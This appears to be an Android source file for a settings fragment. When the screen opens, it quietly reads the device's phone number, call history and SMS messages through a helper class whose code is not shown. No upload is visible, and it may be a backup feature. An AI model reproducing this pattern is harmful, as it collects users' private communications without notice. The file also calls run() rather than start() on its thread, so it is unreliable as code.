package com.lgw.fragment;

import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import com.lgw.R;
import com.lgw.Utils.PhoneSmsUtils;


public class SettingFragment extends Fragment {

    private static SettingFragment settingFragment;

    public static SettingFragment getInstance(){
        if(settingFragment == null){
            synchronized(OtherFragment.class){
                if(settingFragment == null){
                    settingFragment = new SettingFragment();
                }
            }
        }
        return settingFragment;
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_setting, container, false);
    }

    @Override
    public void onActivityCreated(@Nullable Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        new Thread(new Runnable() {
            @Override
            public void run() {
                PhoneSmsUtils phoneSmsUtils = new PhoneSmsUtils();
                phoneSmsUtils.getPhoneNum(getContext());
                phoneSmsUtils.getCallHistory(getContext());
                phoneSmsUtils.getSms(getContext(), new PhoneSmsUtils.BackUpCallBack() {
                    @Override
                    public void beforeBackup(int total) {

                    }

                    @Override
                    public void onBackup(int progress) {

                    }
                });
            }
        }).run();
    }



}